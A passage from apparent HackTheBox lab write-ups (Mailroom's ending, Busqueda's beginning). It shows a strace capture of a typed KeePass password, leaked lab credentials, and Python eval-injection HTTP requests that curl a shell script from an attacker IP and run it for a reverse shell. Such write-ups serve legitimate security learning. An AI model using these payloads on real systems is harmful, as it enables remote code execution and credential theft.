\u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;c\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;U\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;r\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;3\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;p\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;4\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;$\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;$\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;w\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;0\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;1\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;\\10\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;\\10 \\10\u0026#34;, 3) = 3 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;r\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;d\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;9\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;\\n\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 ioctl(0, TCGETS, {B38400 opost -isig -icanon -echo ...}) = 0 ioctl(0, TCGETS, {B38400 opost -isig -icanon -echo ...}) = 0 ioctl(0, SNDCTL_TMR_START or TCSETS, {B38400 opost isig icanon echo ...}) = 0 ioctl(0, TCGETS, {B38400 opost isig icanon echo ...}) = 0 After doing a bit of parsing and cleaning out, I got the key\n!sEcUr3p4$$w0rd9 Downloading the database, I accessed it via GUI (I could’ve accessed it via kpcli but I prefer GUI), we can see that it stores password for the sites along with the root user’s password:\nroot:a$gBa3!GA8 We can just authenticate as root using su and we got the access as root user\n#!/usr/bin/python3 - matthew_kpcli.py import os, random, time, hashlib import pexpect ## This script is used to simulate matthew logging into his database in real time db_path = \u0026#39;/home/matthew/personal.kdbx\u0026#39; db_original = \u0026#39;/root/personal.kdbx\u0026#39; db_checksum = hashlib.md5(open(db_original, \u0026#39;rb\u0026#39;).read()).hexdigest() runas_user = \u0026#39;matthew\u0026#39; def send_human(k, txt): \u0026#34;\u0026#34;\u0026#34; Send each character separately with a slight delay to emulate a human typing \u0026#34;\u0026#34;\u0026#34; for ch in txt: k.send(ch) k.delaybeforesend = random.uniform(0.05, 0.25) k.send(os.linesep) def main(): k = pexpect.spawn(f\u0026#39;/usr/bin/su - {runas_user} -c \u0026#34;/usr/bin/kpcli\u0026#34;\u0026#39;) time.sleep(3) k.expect(\u0026#39;kpcli:/\u0026gt; \u0026#39;) try: while True: # Verify md5sum or db, if fails copy back if hashlib.md5(open(db_path, \u0026#39;rb\u0026#39;).read()).hexdigest() != db_checksum: os.system(f\u0026#39;/usr/bin/cp {db_original} {db_path} \u0026amp;\u0026amp; /usr/bin/chown {runas_user}: {db_path}\u0026#39;) # Check if process is still running if it isnt run it again if not k.isalive(): return None # Kill other previous tracers - To avoid people leaving strace or something on blocking other users from tracing real_pid = int(os.popen(f\u0026#34;/usr/bin/cat /proc/{k.pid}/task/{k.pid}/children\u0026#34;).read()) # Get the child PID (kpcli\u0026#39;s pid) tracer_pid = int(os.popen(f\u0026#34;/usr/bin/cat /proc/{real_pid}/status | /usr/bin/grep Trace | /usr/bin/awk \u0026#39;{{print $2}}\u0026#39;\u0026#34;).read()) if tracer_pid != 0: os.system(f\u0026#34;/usr/bin/kill -5 {tracer_pid}\u0026#34;) # SIGTRAP send_human(k, f\u0026#39;open {db_path}\u0026#39;) k.expect(\u0026#39;Please provide the master password: \u0026#39;) send_human(k, \u0026#39;!sEcUr3p4$$w01\\010rd9\u0026#39;) # \\010 is a del character k.expect(\u0026#39;kpcli:/\u0026gt; \u0026#39;) send_human(k, \u0026#39;ls Root/\u0026#39;) k.expect(\u0026#39;kpcli:/\u0026gt; \u0026#39;) send_human(k, \u0026#39;show -f 0\u0026#39;) k.expect(\u0026#39;kpcli:/\u0026gt; \u0026#39;) time.sleep(3) send_human(k, \u0026#39;quit\u0026#39;) except: return None if __name__ == \u0026#34;__main__\u0026#34;: main() root@mailroom:~# root@mailroom:~/containers# cat docker-compose.yml version: \u0026#39;3\u0026#39; services: db: image: postgres:15.1-bullseye environment: - POSTGRES_USER=gitea - POSTGRES_PASSWORD=gitea_l33t_p@ssw04d - POSTGRES_DB=gitea restart: always volumes: - /root/containers/postgres:/var/lib/postgresql/data networks: - mynetwork gitea: image: gitea/gitea:1.18 environment: - USER_UID=1000 - USER_GID=1000 - DB_TYPE=postgres - DB_HOST=db - DB_NAME=gitea - DB_USER=gitea - DB_PASSWD=gitea_l33t_p@ssw04d restart: always volumes: - /root/containers/gitea:/data depends_on: - db networks: - mynetwork mongodb: image: mongo:4.2.23 restart: always volumes: - /root/containers/db:/data/db networks: - mynetwork sites: cap_drop: - mknod build: context: /root/containers/ dockerfile: /root/containers/Dockerfile ports: - \u0026#34;80:80\u0026#34; depends_on: - gitea - mongodb volumes: - /root/containers/sites:/var/www networks: - mynetwork networks: mynetwork: driver: bridge ipam: config: - subnet: 172.19.0.0/16 ","date":"19 August 2023","permalink":"/posts/mailroom-htb/","section":"Posts","summary":"Writeup for HackTheBox\u0026rsquo;s Mailroom machine.\nStarting off with the nmap scan, we can see that port 80 and 22 is open:\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.","title":"HackTheBox - Mailroom"},{"content":"","date":null,"permalink":"/tags/bash-easy-eval-python-code-injection-relative-path-exploit/","section":"Tags","summary":"","title":"Bash, Easy, Eval, Python-Code-Injection, Relative-Path-Exploit"},{"content":"Writeup for HackTheBox Busqueda Machine\nStarting off with the nmap scan, we see that it has HTTP and SSH, as expected.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) |_ 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-server-header: Apache/2.4.52 (Ubuntu) 8080/tcp open http-proxy? Now, moving on with the searcher.htb , it seems to provide a search service where you can use different search engines\nFrom further enumeration, we identified that the application is built on top of https://github.com/ArjunSharda/Searchor which we got from the footer of the page. The version number mentioned on the page was 2.4.0 and the latest was 2.5.2. To check for the specific version, from the commit changes I noticed there was an eval function which was called with the given values for the query and engine\nAbove code is something of interest, what we can do here is exploit that eval to use python functions like compile (this is used to evaluate the python code as expressions and execute the code) , this can be done by doing something like ' \u0026lt;python code\u0026gt;\nquery=test\u0026#39;+eval(compile(\u0026#39;for x in range(1):\\n import os\\n os.system(\u0026#34;curl 10.10.14.22/shell.sh -o /tmp/shell.sh\u0026#34;)\u0026#39;,\u0026#39;a\u0026#39;,\u0026#39;single\u0026#39;))+\u0026#39; Now, this will execute the payload such that it will call eval again which will evaluate the code compile executing the code, here we downloading a bash script which will later gets executed with os.system\nPOST /search HTTP/1.1 Host: searcher.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 157 Origin: http://searcher.htb Connection: close Referer: http://searcher.htb/ Upgrade-Insecure-Requests: 1 engine=Accuweather\u0026amp;query=test\u0026#39;%2beval(compile(\u0026#39;for+x+in+range(1)%3a\\n+import+os\\n+os.system(\u0026#34;curl+10.10.14.22/shell.sh+-o+/tmp/shell.sh\u0026#34;)\u0026#39;,\u0026#39;a\u0026#39;,\u0026#39;single\u0026#39;))%2b\u0026#39; Now, following will just execute the previously downloaded bash script:\nPOST /search HTTP/1.1 Host: searcher.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 133 Origin: http://searcher.htb Connection: close Referer: http://searcher.htb/ Upgrade-Insecure-Requests: 1 engine=Accuweather\u0026amp;query=test\u0026#39;%2beval(compile(\u0026#39;for+x+in+range(1)%3a\\n+import+os\\n+os.system(\u0026#34;bash+/tmp/shell.sh\u0026#34;)\u0026#39;,\u0026#39;a\u0026#39;,\u0026#39;single\u0026#39;))%2b\u0026#39; Doing so, we got the reverse shell as svc user:\nIn the same directory, there was a .git folder which had the config file which had the password for the cody user:\nbash-5.1$ cat .git/config cat config [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \u0026#34;origin\u0026#34;] url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \u0026#34;main\u0026#34;] remote = origin merge = refs/heads/main The svc user had user.txt which we can get:\nbash-5.1$ cd ~/ cd ~/ bash-5.1$ pwd pwd /home/svc bash-5.1$ ls -la ls -la total 44 drwxr-x--- 6 svc svc 4096 Apr 22 16:42 . drwxr-xr-x 3 root root 4096 Dec 22 18:56 .. lrwxrwxrwx 1 root root 9 Feb 20 12:08 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 svc svc 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 svc svc 3771 Jan 6 2022 